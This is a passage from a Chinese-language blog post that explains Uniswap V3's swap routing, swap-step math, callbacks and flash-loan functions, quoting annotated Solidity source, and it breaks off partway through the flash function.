title="路径编码/解码"></a>路径编码/解码</h3><p>上面输入的参数中 <code>path</code> 字段是 <code>bytes</code> 类型，通过这种类型可以实现更紧凑的编码。Uniswap 会将 <code>bytes</code> 作为一个数组使用，<code>bytes</code> 类型就是一连串的 <code>byte1</code>，但是不会对每一个成员使用一个 word，因此相比普通数组其结构更加紧凑。在 Uniswap V3 中， path 内部编码结构如下图：</p><p><img src="/2023/08/05/03.Uniswap/09.uniswap_v3_code/image-20230805164647310.png" alt="image-20230805164647310"></p><p>图中展示了一个包含 2个路径（pool0, 和 pool1）的 path 编码。Uniswap 将编码解码操作封装在了 <code>Path</code> 库中，本文不再赘述其过程。每次交易时，会取出头部的 <code>tokenIn</code>, <code>tokenOut</code>, <code>fee</code>，使用这三个参数找到对应的交易池，完成交易。</p><h3 id="单个池的交易过程"><a href="#单个池的交易过程" class="headerlink" title="单个池的交易过程"></a>单个池的交易过程</h3><p>单个池的交易在 <code>exactInputSingle</code> 函数中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function exactInputSingle(</span><br><span class="line">    uint256 amountIn,</span><br><span class="line">    address recipient,</span><br><span class="line">    SwapData memory data</span><br><span class="line">) private returns (uint256 amountOut) &#123;</span><br><span class="line">    // 将 path 解码，获取头部的 tokenIn, tokenOut, fee</span><br><span class="line">    (address tokenIn, address tokenOut, uint24 fee) = data.path.decodeFirstPool();</span><br><span class="line"></span><br><span class="line">    // 因为交易池只保存了 token x 的价格，这里我们需要知道输入的 token 是交易池 x token 还是 y token</span><br><span class="line">    bool zeroForOne = tokenIn &lt; tokenOut;</span><br><span class="line"></span><br><span class="line">    // 完成交易</span><br><span class="line">    (int256 amount0, int256 amount1) =</span><br><span class="line">        getPool(tokenIn, tokenOut, fee).swap(</span><br><span class="line">            recipient,</span><br><span class="line">            zeroForOne,</span><br><span class="line">            amountIn.toInt256(),</span><br><span class="line">            zeroForOne ? MIN_SQRT_RATIO : MAX_SQRT_RATIO,</span><br><span class="line">            // 给回调函数用的参数</span><br><span class="line">            abi.encode(data)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    return uint256(-(zeroForOne ? amount1 : amount0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="交易分解"><a href="#交易分解" class="headerlink" title="交易分解"></a>交易分解</h3><p><code>UniswapV3Pool.swap</code> 函数比较长，这里先简要描述其交易步骤：</p><p><img src="/2023/08/05/03.Uniswap/09.uniswap_v3_code/image-20230805165338607.png" alt="image-20230805165338607"></p><p>我们逐步拆解 <code>swap</code> 函数中的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// 将交易前的元数据保存在内存中，后续的访问通过 `MLOAD` 完成，节省 gas</span><br><span class="line">Slot0 memory slot0Start = slot0;</span><br><span class="line">// 防止交易过程中回调到合约中其他的函数中修改状态变量</span><br><span class="line">slot0.unlocked = false;</span><br><span class="line"></span><br><span class="line">// 这里也是缓存交易前的数据，节省 gas</span><br><span class="line">SwapCache memory cache =</span><br><span class="line">    SwapCache(&#123;</span><br><span class="line">        liquidityStart: liquidity,</span><br><span class="line">        blockTimestamp: _blockTimestamp(),</span><br><span class="line">        feeProtocol: zeroForOne ? (slot0Start.feeProtocol % 16) : (slot0Start.feeProtocol &gt;&gt; 4)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">// 判断是否指定了 tokenIn 的数量</span><br><span class="line">bool exactInput = amountSpecified &gt; 0;</span><br><span class="line"></span><br><span class="line">// 保存交易过程中计算所需的中间变量，这些值在交易的步骤中可能会发生变化</span><br><span class="line">SwapState memory state =</span><br><span class="line">    SwapState(&#123;</span><br><span class="line">        amountSpecifiedRemaining: amountSpecified,</span><br><span class="line">        amountCalculated: 0,</span><br><span class="line">        sqrtPriceX96: slot0Start.sqrtPriceX96,</span><br><span class="line">        tick: slot0Start.tick,</span><br><span class="line">        feeGrowthGlobalX128: zeroForOne ? feeGrowthGlobal0X128 : feeGrowthGlobal1X128,</span><br><span class="line">        protocolFee: 0,</span><br><span class="line">        liquidity: cache.liquidityStart</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>上面的代码都是交易前的准备工作，实际的交易在一个循环中发生：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">// 只要 tokenIn</span><br><span class="line">while (state.amountSpecifiedRemaining != 0 &amp;&amp; state.sqrtPriceX96 != sqrtPriceLimitX96) &#123;</span><br><span class="line">    // 交易过程每一次循环的状态变量</span><br><span class="line">    StepComputations memory step;</span><br><span class="line"></span><br><span class="line">    // 交易的起始价格</span><br><span class="line">    step.sqrtPriceStartX96 = state.sqrtPriceX96;</span><br><span class="line"></span><br><span class="line">    // 通过位图找到下一个可以选的交易价格，这里可能是下一个流动性的边界，也可能还是在本流动性中</span><br><span class="line">    (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(</span><br><span class="line">        state.tick,</span><br><span class="line">        tickSpacing,</span><br><span class="line">        zeroForOne</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    // 从 tick index 计算 sqrt(price)</span><br><span class="line">    step.sqrtPriceNextX96 = TickMath.getSqrtRatioAtTick(step.tickNext);</span><br><span class="line"></span><br><span class="line">    // 计算当价格到达下一个交易价格时，tokenIn 是否被耗尽，如果被耗尽，则交易结束，还需要重新计算出 tokenIn 耗尽时的价格</span><br><span class="line">    // 如果没被耗尽，那么还需要继续进入下一个循环</span><br><span class="line">    (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) = SwapMath.computeSwapStep(</span><br><span class="line">        state.sqrtPriceX96,</span><br><span class="line">        (zeroForOne ? step.sqrtPriceNextX96 &lt; sqrtPriceLimitX96 : step.sqrtPriceNextX96 &gt; sqrtPriceLimitX96)</span><br><span class="line">            ? sqrtPriceLimitX96</span><br><span class="line">            : step.sqrtPriceNextX96,</span><br><span class="line">        state.liquidity,</span><br><span class="line">        state.amountSpecifiedRemaining,</span><br><span class="line">        fee</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 更新 tokenIn 的余额，以及 tokenOut 数量，注意当指定 tokenIn 的数量进行交易时，这里的 tokenOut 是负数</span><br><span class="line">    if (exactInput) &#123;</span><br><span class="line">        state.amountSpecifiedRemaining -= (step.amountIn + step.feeAmount).toInt256();</span><br><span class="line">        state.amountCalculated = state.amountCalculated.sub(step.amountOut.toInt256());</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        state.amountSpecifiedRemaining += step.amountOut.toInt256();</span><br><span class="line">        state.amountCalculated = state.amountCalculated.add((step.amountIn + step.feeAmount).toInt256());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    // 按需决定是否需要更新流动性 L 的值</span><br><span class="line">    if (state.sqrtPriceX96 == step.sqrtPriceNextX96) &#123;</span><br><span class="line">        // 检查 tick index 是否为另一个流动性的边界</span><br><span class="line">        if (step.initialized) &#123;</span><br><span class="line">            int128 liquidityNet =</span><br><span class="line">                ticks.cross(</span><br><span class="line">                    step.tickNext,</span><br><span class="line">                    (zeroForOne ? state.feeGrowthGlobalX128 : feeGrowthGlobal0X128),</span><br><span class="line">                    (zeroForOne ? feeGrowthGlobal1X128 : state.feeGrowthGlobalX128)</span><br><span class="line">                );</span><br><span class="line">            // 根据价格增加/减少，即向左或向右移动，增加/减少相应的流动性</span><br><span class="line">            if (zeroForOne) liquidityNet = -liquidityNet;</span><br><span class="line"></span><br><span class="line">            secondsOutside.cross(step.tickNext, tickSpacing, cache.blockTimestamp);</span><br><span class="line"></span><br><span class="line">            // 更新流动性</span><br><span class="line">            state.liquidity = LiquidityMath.addDelta(state.liquidity, liquidityNet);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 在这里更 tick 的值，使得下一次循环时让 tickBitmap 进入下一个 word 中查询</span><br><span class="line">        state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;</span><br><span class="line">    &#125; else if (state.sqrtPriceX96 != step.sqrtPriceStartX96) &#123;</span><br><span class="line">        // 如果 tokenIn 被耗尽，那么计算当前价格对应的 tick</span><br><span class="line">        state.tick = TickMath.getTickAtSqrtRatio(state.sqrtPriceX96);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码即交易的主循环，实现思路即以一个 tickBitmap 的 word 为最大单位，在此单位内计算相同流动性区间的交易数值，如果交易没有完成，那么更新流动性的值，进入下一个流动性区间计算，如果 tick index 移动到 word 的边界，那么步进到下一个 word.</p><p>关于 tickBitmap 中下一个可用价格 tick index 的查找，在函数 <code>TickBitmap</code> 中实现，这里不做详细描述。</p><h3 id="拆分后的交易计算"><a href="#拆分后的交易计算" class="headerlink" title="拆分后的交易计算"></a>拆分后的交易计算</h3><p>交易是否能够结束的关键计算在 <code>SwapMath.computeSwapStep</code> 中完成，这里计算了交易是否能在目标价格范围内结束，以及消耗的 <code>tokenIn</code> 和得到的 <code>tokenOut</code>. 这里摘取此函数部分代码进行分析（这里仅摘取 <code>exactIn</code> 时的代码）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function computeSwapStep(</span><br><span class="line">    uint160 sqrtRatioCurrentX96,</span><br><span class="line">    uint160 sqrtRatioTargetX96,</span><br><span class="line">    uint128 liquidity,</span><br><span class="line">    int256 amountRemaining,</span><br><span class="line">    uint24 feePips</span><br><span class="line">)</span><br><span class="line">    internal</span><br><span class="line">    pure</span><br><span class="line">    returns (</span><br><span class="line">        uint160 sqrtRatioNextX96,</span><br><span class="line">        uint256 amountIn,</span><br><span class="line">        uint256 amountOut,</span><br><span class="line">        uint256 feeAmount</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    // 判断交易的方向，即价格降低或升高</span><br><span class="line">    bool zeroForOne = sqrtRatioCurrentX96 &gt;= sqrtRatioTargetX96;</span><br><span class="line">    // 判断是否指定了精确的 tokenIn 数量</span><br><span class="line">    bool exactIn = amountRemaining &gt;= 0;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>函数的输入参数是当前价格，目标价格，当前的流动性，以及 tokenIn 的余额。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if (exactIn) &#123;</span><br><span class="line">    // 先将 tokenIn 的余额扣除掉最大所需的手续费</span><br><span class="line">    uint256 amountRemainingLessFee = FullMath.mulDiv(uint256(amountRemaining), 1e6 - feePips, 1e6);</span><br><span class="line">    // 通过公式计算出到达目标价所需要的 tokenIn 数量，这里对 x token 和 y token 计算的公式是不一样的</span><br><span class="line">    amountIn = zeroForOne</span><br><span class="line">        ? SqrtPriceMath.getAmount0Delta(sqrtRatioTargetX96, sqrtRatioCurrentX96, liquidity, true)</span><br><span class="line">        : SqrtPriceMath.getAmount1Delta(sqrtRatioCurrentX96, sqrtRatioTargetX96, liquidity, true);</span><br><span class="line">    // 判断余额是否充足，如果充足，那么这次交易可以到达目标交易价格，否则需要计算出当前 tokenIn 能到达的目标交易价</span><br><span class="line">    if (amountRemainingLessFee &gt;= amountIn) sqrtRatioNextX96 = sqrtRatioTargetX96;</span><br><span class="line">    else</span><br><span class="line">        // 当余额不充足的时候计算能够到达的目标交易价</span><br><span class="line">        sqrtRatioNextX96 = SqrtPriceMath.getNextSqrtPriceFromInput(</span><br><span class="line">            sqrtRatioCurrentX96,</span><br><span class="line">            liquidity,</span><br><span class="line">            amountRemainingLessFee,</span><br><span class="line">            zeroForOne</span><br><span class="line">        );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/05/03.Uniswap/09.uniswap_v3_code/image-20230805170213096.png" alt="image-20230805170213096"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// 判断是否能够到达目标价</span><br><span class="line">bool max = sqrtRatioTargetX96 == sqrtRatioNextX96;</span><br><span class="line"></span><br><span class="line">// get the input/output amounts</span><br><span class="line">if (zeroForOne) &#123;</span><br><span class="line">    // 根据是否到达目标价格，计算 amountIn/amountOut 的值</span><br><span class="line">    amountIn = max &amp;&amp; exactIn</span><br><span class="line">        ? amountIn</span><br><span class="line">        : SqrtPriceMath.getAmount0Delta(sqrtRatioNextX96, sqrtRatioCurrentX96, liquidity, true);</span><br><span class="line">    amountOut = max &amp;&amp; !exactIn</span><br><span class="line">        ? amountOut</span><br><span class="line">        : SqrtPriceMath.getAmount1Delta(sqrtRatioNextX96, sqrtRatioCurrentX96, liquidity, false);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 这里对 Output 进行 cap 是因为前面在计算 amountOut 时，有可能会使用 sqrtRatioNextX96 来进行计算，而 sqrtRatioNextX96</span><br><span class="line">// 可能被 Round 之后导致 sqrt_P 偏大，从而导致计算的 amountOut 偏大</span><br><span class="line">if (!exactIn &amp;&amp; amountOut &gt; uint256(-amountRemaining)) &#123;</span><br><span class="line">    amountOut = uint256(-amountRemaining);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (exactIn &amp;&amp; sqrtRatioNextX96 != sqrtRatioTargetX96) &#123;</span><br><span class="line">    // 如果没能到达目标价，即交易结束，剩余的 tokenIn 将全部作为手续费</span><br><span class="line">    // 为了不让计算进一步复杂化，这里直接将剩余的 tokenIn 将全部作为手续费</span><br><span class="line">    // 因此会多收取一部分手续费，即按本次交易的最大手续费收取</span><br><span class="line">    feeAmount = uint256(amountRemaining) - amountIn;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    feeAmount = FullMath.mulDivRoundingUp(amountIn, feePips, 1e6 - feePips);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/05/03.Uniswap/09.uniswap_v3_code/image-20230805170317966.png" alt="image-20230805170317966"></p><h3 id="交易收尾阶段"><a href="#交易收尾阶段" class="headerlink" title="交易收尾阶段"></a>交易收尾阶段</h3><p>我们再回到 <code>swap</code> 函数中循环检查条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while (state.amountSpecifiedRemaining != 0 &amp;&amp; state.sqrtPriceX96 != sqrtPriceLimitX96) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即通过通过 <code>tokenIn</code> 是否还有余额来判断是否还需要继续循环，进入下一步的进行交易计算。当 <code>tokenIn</code> 全部被耗尽后，交易就结束了。当交易结束后，我们还需要做这些事情：</p><ul><li>更新预言机</li><li>更新当前交易对的价格、流动性 </li><li>更新手续费累计值</li><li>扣除用户需要支付的 token</li></ul><p>关于手续费，预言机的相关内容，会在其他部分讲解，我们先跳过这部分代码，直接看 <code>swap</code> 函数的末尾：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// 确定最终用户支付的 token 数和得到的 token 数</span><br><span class="line">(amount0, amount1) = zeroForOne == exactInput</span><br><span class="line">    ? (amountSpecified - state.amountSpecifiedRemaining, state.amountCalculated)</span><br><span class="line">    : (state.amountCalculated, amountSpecified - state.amountSpecifiedRemaining);</span><br><span class="line"></span><br><span class="line">// 扣除用户需要支付的 token</span><br><span class="line">if (zeroForOne) &#123;</span><br><span class="line">    // 将 tokenOut 支付给用户，前面说过 tokenOut 记录的是负数</span><br><span class="line">    if (amount1 &lt; 0) TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));</span><br><span class="line"></span><br><span class="line">    uint256 balance0Before = balance0();</span><br><span class="line">    // 还是通过回调的方式，扣除用户需要支持的 token</span><br><span class="line">    IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);</span><br><span class="line">    // 校验扣除是否成功</span><br><span class="line">    require(balance0Before.add(uint256(amount0)) &lt;= balance0(), &#x27;IIA&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 记录日志</span><br><span class="line">emit Swap(msg.sender, recipient, amount0, amount1, state.sqrtPriceX96, state.tick);</span><br><span class="line">// 解除防止重入的锁</span><br><span class="line">slot0.unlocked = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还是通过回调完成用户支付 token 的费用。因为发送用户 token 是在回调函数之前完成的，因此这个 <code>swap</code> 函数是可以被当作 <code>flash swap</code> 来使用的。</p><p>需要注意，如果本次交易是交易路径中的一次中间交易，那么扣除的 token 是从 <code>SwapRouter</code> 中扣除的，交易完成获得的 token 也会发送给 <code>SwapRouter</code> 以便其进行下一步的交易，我们回到 <code>SwapRouter</code> 中的 <code>exactInput</code> 函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">params.amountIn = exactInputSingle(</span><br><span class="line">    params.amountIn,</span><br><span class="line">    // 这里会判断是否是最后一次交易，当是最后一次交易时，获取的 token 的地址才是用户的指定的地址</span><br><span class="line">    hasPools ? address(this) : params.recipient,</span><br><span class="line">    SwapData(&#123;</span><br><span class="line">        path: params.path.getFirstPool(),</span><br><span class="line">        payer: msg.sender</span><br><span class="line">    &#125;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>再来看一下支付的回调函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function uniswapV3SwapCallback(</span><br><span class="line">    int256 amount0Delta,</span><br><span class="line">    int256 amount1Delta,</span><br><span class="line">    bytes calldata _data</span><br><span class="line">) external override &#123;</span><br><span class="line">    SwapData memory data = abi.decode(_data, (SwapData));</span><br><span class="line">    (address tokenIn, address tokenOut, uint24 fee) = data.path.decodeFirstPool();</span><br><span class="line">    CallbackValidation.verifyCallback(factory, tokenIn, tokenOut, fee);</span><br><span class="line"></span><br><span class="line">    // 这里有点绕，目的就是判断函数的参数中哪个是本次支付需要支付的代币</span><br><span class="line">    (bool isExactInput, uint256 amountToPay) =</span><br><span class="line">        amount0Delta &gt; 0</span><br><span class="line">            ? (tokenIn &lt; tokenOut, uint256(amount0Delta))</span><br><span class="line">            : (tokenOut &lt; tokenIn, uint256(amount1Delta));</span><br><span class="line">    if (isExactInput) &#123;</span><br><span class="line">        // 调用 pay 函数支付代币</span><br><span class="line">        pay(tokenIn, data.payer, msg.sender, amountToPay);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回调完成后，<code>swap</code> 函数会返回本次交易得到的代币数量。<code>exactInput</code> 将判断是否进行下一个路径的交易，直至所有的交易完成，进行输入约束的检查：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(amountOut &gt;= params.amountOutMinimum, &#x27;Too little received&#x27;);</span><br></pre></td></tr></table></figure><p>如果交易的获得 token 数满足约束，则本次交易结束。</p><p>本文仅对 <code>exactInput</code> 这一种交易情况进行了分析，理解了这个交易的整个流程后，就可以触类旁通理解 <code>exactOutput</code> 的交易过程。</p><h2 id="手续费"><a href="#手续费" class="headerlink" title="手续费"></a>手续费</h2><p><a href="https://paco0x.org/uniswap-v3-4/">见大佬博客</a></p><h2 id="预言机"><a href="#预言机" class="headerlink" title="预言机"></a>预言机</h2><p><a href="https://paco0x.org/uniswap-v3-5/">见大佬博客</a></p><h2 id="闪电贷"><a href="#闪电贷" class="headerlink" title="闪电贷"></a>闪电贷</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Uniswap v2 版本中，就已经提供了被称作 flash swap 的闪电贷功能。即可以向一个交易对借贷 x token，但在还贷时使用 y token.</p><p>一个普通的 Uniswap v2 交易的执行顺序为：</p><ol><li>交易之前，Uniswap Pair 合约中 x, y token 余额满足 x⋅y=k</li><li>用户支付 x token 到合约中</li><li>调用合约的交易接口</li><li>合约计算出用户可以得到的 y token，并发送给用户</li><li>交易完成后，Uniswap Pair 合约中 x, y token 余额满足 x1⋅y1 = k1</li></ol><p>以上过程都发生在同一个交易中。</p><p>falsh swap 的实现原理是：</p><ol><li>借贷方可以先向合约借贷 x, y token 中某一个（或者两个都借贷）</li><li>借贷方指定借贷的数量，以及回调函数的参数，调用 flashswap</li><li>合约会先将用户请求借贷的 token 按指定数量发送给借贷方</li><li>发送完毕后，Uniswap Pair 合约会向借贷方指定的合约的地址调用指定的回调函数，并将回调函数的参数传入</li><li>调用完成后，Uniswap Pair 合约检查 x, y token 余额满足 x1⋅y1 = k1</li></ol><p>以上过程都发生在同一个交易中。</p><p>在 flash swap 中，用户可以不需要预先支付 token 就可以得到想要的 token，这部分需要支付的 token 只需要在回调函数中转回给合约即可。在 flashswap 完成后 AMM 池中的价格会发生改变（如果使用同币种还债则价格不会改变）。flash swap 可以用来进行 AMM 之间套利，借贷平台清算等操作。</p><p>flash swap 类似于一个功能更强的闪电贷，一个接口即可完成借贷和交易的操作。关于 flash swap 的更多内容，可以参考<a href="https://uniswap.org/docs/v2/smart-contract-integration/using-flash-swaps/">官方文档</a>。</p><p>理解闪电贷，你才能理解 DeFi. 虽然 DeFi 领域一直有着大大小小的创新，号称颠覆传统金融。但是在我看来，只有闪电贷才是真正的颠覆者，它是 DeFi 的精髓。它区块链和智能合约的特性发挥到了极致，使得借贷资金的使用效率在短时间内提升到了前所未有的高度。引用 DODO 文档里一段话：</p><blockquote><p>Once you have a deep understanding of flash swap, you will realize the superiority of the DeFi world over the centralized world. The composability of smart contracts has elevated the fund utilization of DeFi to an unprecedented level. Thanks to trustlessness, the cost of credit in DeFi is incredibly low. Once this financial system is integrated into the real world, its potential for improving our society and productivity will be truly boundless. The DODO team hopes that flash swap serves as a primer for DeFi builders and beginners alike to gain an appreciation for the power of DeFi.</p></blockquote><h3 id="V3的falshswap"><a href="#V3的falshswap" class="headerlink" title="V3的falshswap"></a>V3的falshswap</h3><p>Uniswap v3 版本中，和 v2 一样也有两种闪电贷的方式，但是是通过不同的函数接口来完成的。</p><ul><li>第一种是普通的闪电贷，即借入 token 和还贷 token 相同，通过 <code>UniswapV3Pool.flash()</code> 完成</li><li>第二种是类似 v2 的 <code>flash swap</code>，即借入 token 和还贷 token 不同，这个是通过 <code>UniswapV3Pool.swap()</code> 来完成的。</li></ul><h3 id="flash"><a href="#flash" class="headerlink" title="flash"></a>flash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">function flash(</span><br><span class="line">    address recipient,   // 借贷方地址，用于调用回调函数</span><br><span class="line">    uint256 amount0,     // 借贷的 token0 的数量</span><br><span class="line">    uint256 amount1,     // 借贷的 token1 的数量</span><br><span class="line">    bytes calldata data  // 回调函数的参数</span><br><span class="line">) external override lock noDelegateCall &#123;</span><br><span class="line">    uint128 _liquidity = liquidity;</span><br><span class="line">    require(_liquidity &gt; 0, &#x27;L&#x27;);</span><br><span 